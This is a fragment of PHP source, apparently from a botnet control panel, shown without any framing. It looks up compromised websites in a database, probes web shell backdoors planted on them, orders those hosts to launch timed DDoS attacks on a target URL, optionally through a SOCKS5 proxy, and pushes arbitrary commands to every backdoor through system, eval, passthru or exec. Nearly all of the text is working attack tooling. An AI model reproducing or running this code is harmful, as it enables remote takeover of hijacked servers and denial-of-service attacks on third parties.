    )
);
}
curl_setopt_array($ch, $curlConfig);
$result = curl_exec($ch);
curl_close($ch);

echo '<br /><p>Killed all actions for id <b>'.$_POST['botid1'].'</b>.</p>';

} else {
    echo '<br /><p>Backdoor with id <b>'.htmlspecialchars($_POST['botid1']).'</b> don\'t support ddos.</p>';
}

        } elseif($_POST['sup'] == 'attack') {

$source = conn($row['url'].'?_=system&__=uname');
if(strpos($source, md5(666))) {
$ch = curl_init();
if(USE_PROXY == 1) {
$curlConfig = array(
    CURLOPT_PROXY          => PROXY_IP.':'.PROXY_PORT,
    CURLOPT_PROXYTYPE      => CURLPROXY_SOCKS5,
    CURLOPT_URL            => $row['url'],
    CURLOPT_POST           => true,
    CURLOPT_POSTFIELDS     => array(
        'target' => $_POST['url1'],
        'time'   => $_POST['time1']
    )
);
} else {
$curlConfig = array(
    CURLOPT_URL            => $row['url'],
    CURLOPT_POST           => true,
    CURLOPT_POSTFIELDS     => array(
        'target' => $_POST['url1'],
        'time'   => $_POST['time1']
    )
);
}

curl_setopt_array($ch, $curlConfig);
$result = curl_exec($ch);
curl_close($ch);

echo '<br /><p>Attacked '.$_POST['url1'].' for '.$_POST['time1']. ' seconds with bot id <b>'.$_POST['botid1'].'</b>.</p>';

} else {
    echo '<br /><p>Backdoor with id <b>'.htmlspecialchars($_POST['botid1']).'</b> don\'t support ddos.</p>';
}

        }

    
} else {
    echo '<br /><p>No shell found for id <b>'.htmlspecialchars($_POST['botid1']).'</b></p>';
}
}
}

function run() {

if(isset($_POST['cmd']) && isset($_POST['func'])) {

$conn = mysql_connect(SQL_HOST, SQL_USER, SQL_PWD);
mysql_select_db(SQL_DB, $conn);
$rows = mysql_query('SELECT * FROM `bots`', $conn);    

while($row = mysql_fetch_assoc($rows)) {

$source = conn($row['url'].'?_=system&__=uname');
if(strpos($source, md5("#666#".date("h:d"))) && $_POST['func'] == 'system' || $_POST['func'] == 'eval' || $_POST['func'] == 'passthru' || $_POST['func'] == 'exec') {
$x = conn($row['url'].'?_='.$_POST['func'].'&__='.urlencode($_POST['cmd']));

$y = explode("{:|", $x);
echo '<p class=\'meta\'><b>'.htmlspecialchars($row['url']).'</b></p><pre>'.htmlspecialchars($y[1]).'</pre>';

}
}

}
}
?>
